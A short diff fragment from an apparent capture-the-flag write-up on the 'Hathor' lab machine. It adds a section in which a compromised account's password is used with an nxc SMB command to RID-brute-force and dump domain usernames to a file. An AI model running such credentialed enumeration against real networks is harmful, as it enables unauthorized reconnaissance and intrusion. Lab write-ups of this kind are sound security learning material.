@@ -261,3 +261,10 @@ SMB         hathor.windcorp.htb 445    hathor           [+] windcorp.htb\beatric
 ```
 This user is compromised!
 
+# Enumeration as `BeatriceMill`
+
+```python
+nxc smb hathor.windcorp.htb -u 'beatricemill' -p '!!!!ilovegood17' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
+```
+Ill use this command to dump all the user to a user file!
+
